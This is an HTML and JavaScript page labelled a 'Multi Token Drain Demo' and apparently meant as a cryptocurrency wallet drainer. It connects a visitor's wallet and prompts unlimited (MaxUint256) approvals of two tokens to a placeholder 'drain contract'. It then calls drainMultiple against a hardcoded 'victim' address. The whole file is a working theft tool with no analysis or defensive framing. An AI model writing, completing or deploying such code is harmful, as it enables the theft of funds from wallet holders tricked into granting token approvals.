<!DOCTYPE html>
<html>
<head>
  <title>Multi Token Drain Demo</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
</head>

<body style="font-family:sans-serif">

<h2>Demo: Connect → Approve → Drain Multiple</h2>

<button onclick="connect()">Connect Wallet</button><br><br>

<button onclick="approveTokenA()">Approve Token A</button><br><br>
<button onclick="approveTokenB()">Approve Token B</button><br><br>

<button onclick="drainAll()">💣 Drain All Tokens</button>

<script>
let provider, signer, userAddress;

// 🔁 TOKEN ADDRESSES
const tokenA = "0x089d6677646bc535B1A8535ED856bb17493E332d";
const tokenB = "PASTE_TOKEN_B_ADDRESS_HERE";

// 🔁 DRAIN CONTRACT
const drainAddress = "PASTE_DRAIN_MULTI_CONTRACT";

// 🔁 VICTIM
const victimAddress = "0xb52d3770bcf4673009f2f6bf8ba9177cba46d283";

const tokenABI = [
  "function approve(address spender, uint256 amount) public returns (bool)"
];

const drainABI = [
  "function drainMultiple(address[] memory tokens, address victim) public"
];

// CONNECT
async function connect() {
  try {
    if (!window.ethereum) {
      alert("Open inside Trust Wallet browser");
      return;
    }

    await window.ethereum.request({ method: "eth_requestAccounts" });

    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
    signer = provider.getSigner();

    await provider.getNetwork();

    userAddress = await signer.getAddress();

    alert("✅ Connected: " + userAddress);

  } catch (e) {
    alert("❌ Connect error: " + e.message);
  }
}

// APPROVE TOKEN A
async function approveTokenA() {
  try {
    if (!signer) {
      alert("Connect wallet first");
      return;
    }

    const contract = new ethers.Contract(tokenA, tokenABI, signer);

    const tx = await contract.approve(
      drainAddress,
      ethers.constants.MaxUint256
    );

    await tx.wait();

    alert("✅ Token A Approved");

  } catch (e) {
    alert("❌ Error: " + e.message);
  }
}

// APPROVE TOKEN B
async function approveTokenB() {
  try {
    if (!signer) {
      alert("Connect wallet first");
      return;
    }

    const contract = new ethers.Contract(tokenB, tokenABI, signer);

    const tx = await contract.approve(
      drainAddress,
      ethers.constants.MaxUint256
    );

    await tx.wait();

    alert("✅ Token B Approved");

  } catch (e) {
    alert("❌ Error: " + e.message);
  }
}

// DRAIN ALL
async function drainAll() {
  try {
    if (!signer) {
      alert("Connect wallet first");
      return;
    }

    await provider.getNetwork();

    const contract = new ethers.Contract(drainAddress, drainABI, signer);

    const tokens = [tokenA, tokenB];

    const tx = await contract.drainMultiple(tokens, victimAddress);

    await tx.wait();

    alert("💣 All tokens drained");

  } catch (e) {
    alert("❌ Drain error: " + e.message);
  }
}
</script>

</body>
</html>
